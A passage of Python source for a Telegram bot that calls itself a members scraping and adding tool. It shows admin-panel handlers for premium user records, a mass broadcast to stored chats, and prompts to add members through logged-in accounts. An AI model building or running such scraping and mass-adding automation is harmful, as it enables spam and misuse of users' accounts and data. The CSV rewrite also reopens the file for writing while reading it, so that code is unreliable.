      await app.send_message(update.message.chat.id, """**ᴛʜᴇʀᴇ ɪꜱ ɴᴏᴛʜɪɴɢ ɴᴏ ᴍᴏʀᴇ..!\nᴊᴜꜱᴛ ᴄʟɪᴄᴋ ᴏɴ /adding ᴛᴏ ꜱᴛᴀʀᴛ ᴀᴅᴅɪɴɢ ꜰʀᴏᴍ ʟᴏɢɪɴ✅ ᴀᴄᴄᴏᴜɴᴛ.\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**""") 
   elif "Edit" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**ᴛʜᴇʀᴇ ɪꜱ ɴᴏᴛʜɪɴɢ ɴᴏ ᴍᴏʀᴇ..!\nᴊᴜꜱᴛ ᴄʟɪᴄᴋ ᴏɴ /phone ᴛᴏ ʟᴏɢɪɴ ᴀɴᴅ ᴄʜᴇᴄᴋ ꜱᴛᴀᴛꜱ ᴏꜰ ᴀᴄᴄᴏᴜɴᴛ.\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**""") 
   elif "Home" in k:
      await update.message.delete()
      await app.send_message(update.message.chat.id, """**ᴛʜᴇʀᴇ ɪꜱ ɴᴏᴛʜɪɴɢ ɴᴏ ᴍᴏʀᴇ..!\nᴊᴜꜱᴛ ᴄʟɪᴄᴋ ᴏɴ /start ᴛᴏ ɢᴏ ʜᴏᴍᴇ.\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**""") 
   elif "Users" in k:
      await update.message.delete()
      msg = await app.send_message(update.message.chat.id,"ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ...")
      messages = await users_info(app)
      await msg.edit(f"Total:\n\nᴜꜱᴇʀꜱ - {messages[0]}\nʙʟᴏᴄᴋᴇᴅ - {messages[1]}")
   elif "New" in k:
      await update.message.delete()
      number = await app.ask(chat_id=update.message.chat.id, text="**ꜱᴇɴᴅ ᴜꜱᴇʀ ɪᴅ ᴏꜰ ɴᴇᴡ ᴜꜱᴇʀ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
      phone = int(number.text)
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         f.closed
         f = open("data.csv", "w", encoding='UTF-8')
         writer = csv.writer(f, delimiter=",", lineterminator="\n")
         writer.writerow(['sr. no.', 'user id', "Date"])
         a=1
         for i in rows:
            writer.writerow([a, i[1],i[2]])
            a+=1
         writer.writerow([a, phone, date.today() ])
         PREMIUM.append(int(phone))
         await app.send_message(chat_id=update.message.chat.id,text="ᴅᴏɴᴇ ꜱᴜᴄᴇꜱꜱꜰᴜʟʟʏ")

   elif "Check" in k:
      await update.message.delete()
      with open("data.csv", encoding='UTF-8') as f:
         rows = csv.reader(f, delimiter=",", lineterminator="\n")
         next(rows, None)
         E="**ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀꜱ**\n"
         a=0
         for row in rows:
            d = datetime.today() - datetime.strptime(f"{row[2]}", '%Y-%m-%d')
            r = datetime.strptime("2021-12-01", '%Y-%m-%d') - datetime.strptime("2021-11-03", '%Y-%m-%d')
            if d<=r:
               a+=1
               E+=f"{a}). {row[1]} - {row[2]}\n"
         E+="\n\n**ᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**"
         await app.send_message(chat_id=update.message.chat.id,text=E)

   elif "Admin" in k:
      await update.message.delete()
      if update.message.chat.id in OWNER:
         but = InlineKeyboardMarkup([[InlineKeyboardButton("ᴜꜱᴇʀꜱ✅", callback_data="Users")], [InlineKeyboardButton("ʙʀᴏᴀᴅᴄᴀꜱᴛ💯", callback_data="Broadcast")],[InlineKeyboardButton("ᴀᴅᴅ ᴜꜱᴇʀ", callback_data="New")], [InlineKeyboardButton("ᴄʜᴇᴄᴋ ᴜꜱᴇʀꜱ", callback_data="Check")]])
         await app.send_message(chat_id=update.message.chat.id,text=f"**ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴɴᴇʟ ᴏꜰ ɪɴᴅᴜᴄᴇᴅ ʙᴏᴛ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**", reply_markup=but)
      else:
         await app.send_message(chat_id=update.message.chat.id,text="**ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ʙᴏᴛ \n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
   elif "Broadcast" in k:
    try:
      query = await query_msg()
      a=0
      b=0
      number = await app.ask(chat_id=update.message.chat.id, text="**ɴᴏᴡ ᴍᴇ ᴍᴇꜱꜱᴀɢᴇ ꜰᴏʀ ʙʀᴏᴀᴅᴄᴀꜱᴛ\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")
      phone = number.text
      for row in query:
         chat_id = int(row[0])
         try:
            await app.send_message(chat_id=int(chat_id), text=f"{phone}", parse_mode="markdown", disable_web_page_preview=True)
            a+=1
         except FloodWait as e:
            await asyncio.sleep(e.x)
            b+=1
         except Exception:
            b+=1
            pass
      await app.send_message(update.message.chat.id,f"ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ʙʀᴏᴀᴅᴄᴀꜱᴛᴇᴅ ᴛᴏ {a} ᴄʜᴀᴛꜱ\nꜰᴀɪʟᴇᴅ - {b} ᴄʜᴀᴛꜱ !")
    except Exception as e:
      await app.send_message(update.message.chat.id,f"**ᴇʀʀᴏʀ: {e}\n\nᴍᴀᴅᴇ ᴡɪᴛʜ ❤️ ʙʏ @BT46ER**")




text = """
╔════╗ㅤMembers 
╚═╗╔═╝ Scraping Bot
╔═╣╠═╗
║╔╣╠╗║ㅤInduced
║╚╣╠╝║ Scraper Bot
╚═╣╠═╝
╔═╝╚═╗ 
╚════╝ 
"""
print(text)
print("ɪɴᴅᴜᴄᴇᴅ ᴀᴅᴅɪɴɢ ꜱᴛᴀʀᴛᴇᴅ ꜱᴜᴄᴇꜱꜱꜰᴜʟʟʏ........")
app.run()
